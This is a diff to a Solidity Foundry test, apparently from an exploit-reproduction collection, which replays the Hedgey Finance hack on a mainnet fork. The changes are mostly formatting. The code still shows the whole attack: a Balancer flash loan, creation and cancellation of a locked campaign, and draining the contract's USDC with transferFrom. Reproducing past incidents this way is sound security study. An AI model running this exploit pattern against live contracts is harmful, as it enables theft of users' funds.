@@ -16,13 +16,13 @@ import "../interface.sol";
 // @Analysis
 // Post-mortem : https://medium.com/@CUBE3AI/hedgey-finance-hack-detected-by-cube3-ai-minutes-before-exploit-1f500e7052d4
 // Twitter Guy : https://twitter.com/Cube3AI/status/1781294512716820918
-// Hacking God : 
+// Hacking God :
 
 enum TokenLockup {
     Unlocked,
     Locked,
     Vesting
-  }
+}
 
 struct Campaign {
     address manager;
@@ -31,7 +31,7 @@ struct Campaign {
     uint256 end;
     TokenLockup tokenLockup;
     bytes32 root;
-  }
+}
 
 struct Donation {
     address tokenLocker;
@@ -50,8 +50,7 @@ struct ClaimLockup {
     uint256 periods;
 }
 
-interface IClaimCampaigns{
-
+interface IClaimCampaigns {
     function createLockedCampaign(
         bytes16 id,
         Campaign memory campaign,
@@ -59,12 +58,13 @@ interface IClaimCampaigns{
         Donation memory donation
     ) external;
 
-    function cancelCampaign(bytes16 campaignId) external;
+    function cancelCampaign(
+        bytes16 campaignId
+    ) external;
 }
 
-
 contract HedgeyFinance is Test {
-    uint256 blocknumToForkFrom = 19687890-1;
+    uint256 blocknumToForkFrom = 19_687_890 - 1;
 
     IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -76,9 +76,8 @@ contract HedgeyFinance is Test {
     uint256 loan = 1_305_000 * 1e6;
 
     function setUp() public {
-
         vm.createSelectFork("mainnet", blocknumToForkFrom);
-        
+
         vm.label(address(USDC), "USDC");
         vm.label(address(BalancerVault), "BalancerVault");
     }
@@ -98,7 +97,9 @@ contract HedgeyFinance is Test {
         uint256 HedgeyFinance_balance = USDC.balanceOf(address(HedgeyFinance));
         USDC.transferFrom(address(HedgeyFinance), address(this), HedgeyFinance_balance);
 
-        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+        );
     }
 
     function receiveFlashLoan(
@@ -117,7 +118,7 @@ contract HedgeyFinance is Test {
         campaign.manager = address(this);
         campaign.token = address(USDC);
         campaign.amount = loan;
-        campaign.end = 3133666800;
+        campaign.end = 3_133_666_800;
         campaign.tokenLockup = TokenLockup.Locked;
         campaign.root = ""; // 0x0000000000000000000000000000000000000000000000000000000000000000
 
@@ -137,16 +138,11 @@ contract HedgeyFinance is Test {
         donation.cliff = 0;
         donation.period = 0;
 
-        HedgeyFinance.createLockedCampaign(
-            campaign_id, 
-            campaign, 
-            claimLockup,
-            donation);
+        HedgeyFinance.createLockedCampaign(campaign_id, campaign, claimLockup, donation);
 
         HedgeyFinance.cancelCampaign(campaign_id);
 
         // pay back the FlashLoan
         USDC.transfer(address(BalancerVault), loan);
     }
-
 }
